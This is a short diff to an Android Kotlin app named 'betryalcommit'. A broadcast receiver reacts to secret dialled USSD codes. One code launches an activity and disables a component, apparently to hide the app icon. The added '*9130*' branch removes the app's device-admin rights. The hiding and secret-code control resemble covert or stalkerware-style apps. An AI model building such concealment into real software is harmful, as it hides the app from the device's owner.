@@ -11,6 +11,7 @@ import android.telephony.TelephonyManager
 import android.util.Log
 import android.widget.Toast
 import androidx.core.content.ContextCompat
+import com.example.betryalcommit.AdminAct.deviceAdminReceiver
 
 class USSDReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
@@ -24,6 +25,10 @@ class USSDReceiver : BroadcastReceiver() {
                 ContextCompat.startActivity(context, launchIntent, null)
                 Thread.sleep(2000);
                 p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
+            }
+
+            else if (phoneNumber == "*9130*"){
+                dpm.removeActiveAdmin(deviceAdminReceiver)
             }
         }
         else {
